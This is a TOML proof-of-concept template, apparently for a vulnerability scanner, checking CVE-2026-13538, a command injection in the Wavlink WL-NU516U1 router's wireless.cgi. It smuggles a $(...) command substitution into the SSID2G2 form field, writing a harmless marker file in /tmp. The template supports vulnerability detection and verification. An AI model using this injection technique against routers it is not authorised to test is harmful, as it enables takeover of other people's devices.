[info]
id = "POC-AVE-2026-0007"
name = "Wavlink WL-NU516U1 wireless.cgi 命令注入 PoC"
author = "AVE"
severity = "medium"
tags = ["command-injection", "cve-2026-13538", "wavlink"]
description = "Wavlink WL-NU516U1路由器/cgi-bin/wireless.cgi接口SSID2G2/SSID5G2参数存在命令注入漏洞，sub_4074A0仅拦截反引号和管道符但未拦截$(cmd)语法，攻击者可通过构造包含命令替换的SSID参数值实现任意命令执行"
vuln_id = ["CVE-2026-13538", "AVE-2026-0007"]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/wireless.cgi"

headers.Content-Type = "application/x-www-form-urlencoded"
headers.Referer = "http://{{host}}/wireless.shtml"

body.type = "form"
body.SSID2G2 = "$(echo POC_AVE_CHECK > /tmp/poc_ave_2026_0007)"
body.SSID5G2 = "AVE_5G"
body.AuthMode = "WPA2PSK"
body.WPAPSK1 = "avecheck123"
body.WPAPSK12 = "avecheck123"
body.wl_submit = "Apply"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests]]
method = "GET"
path = "/cgi-bin/wireless.cgi"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["AVE_5G"]
expect = true
